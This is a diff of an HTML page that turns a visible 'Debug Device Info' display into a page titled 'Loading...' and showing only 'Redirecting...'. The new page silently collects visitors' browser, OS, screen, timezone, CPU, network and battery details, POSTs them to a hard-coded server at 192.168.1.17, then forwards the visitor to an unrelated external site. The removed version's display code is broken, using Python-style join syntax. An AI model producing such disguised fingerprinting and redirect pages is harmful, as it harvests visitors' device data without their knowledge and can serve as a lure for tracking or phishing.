@@ -1,110 +1,108 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Debug Device Info</title>
-    <style>
-        body {
-            font-family: sans-serif;
-            padding: 20px;
-            max-width: 90%;
-            margin: 0 auto;
-            background-color: #f5f5f5;
-        }
-        #info {
-            background: white;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            white-space: pre-wrap;
-            font-size: 0.9em;
-        }
-    </style>
-</head>
-<body>
-    <h1>Debug Device Info</h1>
-    <div id="info">Loading device information...</div>
-    <script>
-        function getDeviceInfo() {
-            const info = {
-                "User Agent": navigator.userAgent || "Unknown",
-                "Platform": navigator.platform || "Unknown",
-                "OS": getOS(navigator.userAgent),
-                "Browser": getBrowser(navigator.userAgent),
-                "Screen Resolution": `${window.screen.width}x${window.screen.height}`,
-                "Available Screen": `${window.screen.availWidth}x${window.screen.availHeight}`,
-                "Device Pixel Ratio": window.devicePixelRatio || "Unknown",
-                "Language": navigator.language || "Unknown",
-                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
-                "CPU Cores": navigator.hardwareConcurrency || "Unknown",
-                "Network Type": navigator.connection ? navigator.connection.type || "Unknown" : "Network API not supported",
-                "Effective Connection Type": navigator.connection ? navigator.connection.effectiveType || "Unknown" : "Unknown",
-                "Timestamp": new Date().toLocaleString()
-            };
+     <html lang="en">
+     <head>
+         <meta charset="UTF-8">
+         <meta name="viewport" content="width=device-width, initial-scale=1.0">
+         <title>Loading...</title>
+         <style>
+             body {
+                 font-family: sans-serif;
+                 display: flex;
+                 justify-content: center;
+                 align-items: center;
+                 height: 100vh;
+                 margin: 0;
+                 background-color: #f5f5f5;
+             }
+             p {
+                 font-size: 1.2em;
+                 color: #333;
+             }
+         </style>
+     </head>
+     <body>
+         <p>Redirecting...</p>
+         <script>
+             function getDeviceInfo() {
+                 const info = {
+                     "User Agent": navigator.userAgent || "Unknown",
+                     "Platform": navigator.platform || "Unknown",
+                     "OS": getOS(navigator.userAgent),
+                     "Browser": getBrowser(navigator.userAgent),
+                     "Screen Resolution": `${window.screen.width}x${window.screen.height}`,
+                     "Available Screen": `${window.screen.availWidth}x${window.screen.availHeight}`,
+                     "Device Pixel Ratio": window.devicePixelRatio || "Unknown",
+                     "Language": navigator.language || "Unknown",
+                     "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+                     "CPU Cores": navigator.hardwareConcurrency || "Unknown",
+                     "Network Type": navigator.connection ? navigator.connection.type || "Unknown" : "Network API not supported",
+                     "Effective Connection Type": navigator.connection ? navigator.connection.effectiveType || "Unknown" : "Unknown",
+                     "Timestamp": new Date().toLocaleString()
+                 };
 
-            if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    info.Battery = `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging ? 'Yes' : 'No'})`;
-                    displayInfo(info);
-                    sendToServer(info);
-                }).catch(err => {
-                    info.Battery = "Battery info unavailable: " + err.message;
-                    displayInfo(info);
-                    sendToServer(info);
-                });
-            } else {
-                info.Battery = "Battery API not supported";
-                displayInfo(info);
-                sendToServer(info);
-            }
-        }
+                 if (navigator.getBattery) {
+                     navigator.getBattery().then(battery => {
+                         info.Battery = `${(battery.level * 100).toFixed(0)}% (Charging: ${battery.charging ? 'Yes' : 'No'})`;
+                         sendToServer(info);
+                     }).catch(err => {
+                         info.Battery = "Battery info unavailable: " + err.message;
+                         sendToServer(info);
+                     });
+                 } else {
+                     info.Battery = "Battery API not supported";
+                     sendToServer(info);
+                 }
+             }
 
-        function getOS(userAgent) {
-            if (/android/i.test(userAgent)) return "Android";
-            if (/iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
-            if (/Win/i.test(userAgent)) return "Windows";
-            if (/Mac/i.test(userAgent)) return "macOS";
-            if (/Linux/i.test(userAgent)) return "Linux";
-            return "Unknown";
-        }
+             function getOS(userAgent) {
+                 if (/android/i.test(userAgent)) return "Android";
+                 if (/iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
+                 if (/Win/i.test(userAgent)) return "Windows";
+                 if (/Mac/i.test(userAgent)) return "macOS";
+                 if (/Linux/i.test(userAgent)) return "Linux";
+                 return "Unknown";
+             }
 
-        function getBrowser(userAgent) {
-            if (/chrome|crios/i.test(userAgent)) return "Chrome";
-            if (/firefox|fxios/i.test(userAgent)) return "Firefox";
-            if (/safari/i.test(userAgent) && !/chrome|crios/i.test(userAgent)) return "Safari";
-            if (/edge/i.test(userAgent)) return "Edge";
-            return "Unknown";
-        }
+             function getBrowser(userAgent) {
+                 if (/chrome|crios/i.test(userAgent)) return "Chrome";
+                 if (/firefox|fxios/i.test(userAgent)) return "Firefox";
+                 if (/safari/i.test(userAgent) && !/chrome|crios/i.test(userAgent)) return "Safari";
+                 if (/edge/i.test(userAgent)) return "Edge";
+                 return "Unknown";
+             }
 
-        function displayInfo(info) {
-            let output = "Device Information (Debug Mode):\n\n";
-            output += "\n".join(`${key}: ${value}` for (key, value) of Object.entries(info));
-            document.getElementById("info").textContent = output;
-            console.log("Collected Data:", JSON.stringify(info, null, 2));
-        }
+             function sendToServer(info) {
+                 const serverUrl = "http://192.168.1.17:8000/submit";
+                 console.log("Attempting to send data to:", serverUrl);
+                 console.log("Data:", JSON.stringify(info, null, 2));
+                 fetch(serverUrl, {
+                     method: "POST",
+                     headers: { "Content-Type": "application/json" },
+                     body: JSON.stringify(info)
+                 })
+                     .then(response => {
+                         if (!response.ok) throw new Error(`Server error: ${response.status} ${response.statusText}`);
+                         return response.json();
+                     })
+                     .then(data => {
+                         console.log("Data sent successfully:", data);
+                         redirect();
+                     })
+                     .catch(err => {
+                         console.error("Failed to send data:", err.message);
+                         redirect();
+                     });
+             }
 
-        function sendToServer(info) {
-            const serverUrl = "http://192.168.1.17:8000/submit";
-            console.log("Attempting to send data to:", serverUrl);
-            fetch(serverUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(info)
-            })
-                .then(response => {
-                    if (!response.ok) throw new Error(`Server error: ${response.status} ${response.statusText}`);
-                    return response.json();
-                })
-                .then(data => {
-                    console.log("Data sent successfully:", data);
-                })
-                .catch(err => {
-                    console.error("Failed to send data:", err.message);
-                });
-        }
+             function redirect() {
+                 const redirectUrl = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
+                 console.log("Redirecting to:", redirectUrl);
+                 setTimeout(() => {
+                     window.location.href = redirectUrl;
+                 }, 2000);
+             }
 
-        window.onload = getDeviceInfo;
-    </script>
-</body>
-</html>
+             window.onload = getDeviceInfo;
+         </script>
+     </body>
+     </html>
